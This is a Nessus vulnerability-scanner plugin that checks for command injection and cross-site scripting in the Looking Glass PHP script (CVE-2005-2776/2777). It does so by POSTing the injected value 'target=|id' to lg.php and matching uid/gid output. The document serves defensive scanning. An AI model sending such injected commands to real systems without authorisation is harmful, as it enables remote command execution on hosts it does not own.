#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(19523);
  script_version("$Revision: 1.24 $");
  script_cvs_date("$Date: 2016/10/27 15:03:54 $");

  script_cve_id("CVE-2005-2776", "CVE-2005-2777");
  script_bugtraq_id(14680, 14682);
  script_osvdb_id(19051, 19052, 19053);

  script_name(english:"Looking Glass Multiple Vulnerabilities");
  script_summary(english:"Checks for multiple vulnerabilities in Looking Glass");
 
  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple issues." );
  script_set_attribute(attribute:"description", value:
"The remote host appears to be running Jurriaan de Neef's Looking Glass
script, which provides a web interface to various network utilities
such as ping, traceroute, and whois. 

The installed version of Looking Glass suffers from a flaw that allows
an attacker, by manipulating input to the 'target' parameter of the
'lp.php' script, to execute commands on the remote host subject to the
permissions of the web server user id.  In addition, it also is prone
to cross-site scripting attacks due to its failure to sanitize
user-supplied input to the 'version' parameter of the 'header.php' and
'footer.php' scripts." );
  script_set_attribute(attribute:"see_also", value:"http://retrogod.altervista.org/lookingglass.html" );
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2005/Aug/379" );
  script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"plugin_publication_date", value: "2005/08/30");
  script_set_attribute(attribute:"vuln_publication_date", value: "2005/08/27");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:looking_glass:looking_glass");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, php:TRUE);

# Loop through CGI directories.
foreach dir (cgi_dirs())
{
  # Make sure the affected script exists.
  w = http_send_recv3(method:"GET", item:string(dir, "/lg.php"), port:port, exit_on_fail:TRUE);
  res = w[2];

  # If it looks like the affected script...
  if (
    '<option value="dnsa">' >< res && 
    '<input type="text" name="target"' >< res
  ) {
    # Try to exploit the flaw to run a command.
    postdata = string(
      "func=dnsa&",
      "ipv=ipv4&",
      # nb: run 'id'.
      "target=|id"
    );
    w = http_send_recv3(method: "POST", port: port,
      item: dir+"/lg.php", content_type: "application/x-www-form-urlencoded",
      data: postdata,
      exit_on_fail:TRUE);
    res = w[2];

    pat = "^uid=[0-9]+.*gid=[0-9]+.*$";
    matches = egrep(string:res, pattern:pat);
    if (matches)
    {
      foreach match (split(matches))
      {
        output = match;
        break;
      }
    }
    if (output)
    {
      report = string(
        "Nessus was able to execute the command 'id' on the remote host.\n",
        "\n",
        "  Request:  POST ", dir, "/lg.php\n",
        "  Output:   ", output, "\n"
      );
      security_hole(port:port, extra:report);
      set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
      exit(0);
    }
  }
}
